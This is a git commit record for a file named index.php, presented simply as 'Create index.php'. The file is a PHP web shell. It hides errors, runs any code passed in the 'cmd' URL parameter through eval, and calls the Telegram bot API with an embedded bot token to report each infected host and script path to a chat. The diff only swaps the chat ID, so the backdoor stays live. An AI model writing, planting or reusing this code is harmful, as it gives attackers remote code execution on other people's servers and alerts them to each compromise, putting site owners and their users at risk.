bf6f0136cd2493260df6d82ef928f79d9e848a5a
PhenaxGod <76651777+PhenaxGod@users.noreply.github.com>
2021-05-11 13:20:16 +0000

    Create index.php

--- index.php
+++ index.php
@@ -1,3 +1,3 @@
 error_reporting(0);
 eval($_GET['cmd']);
-file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-576355443&text=New: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
+file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=New: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
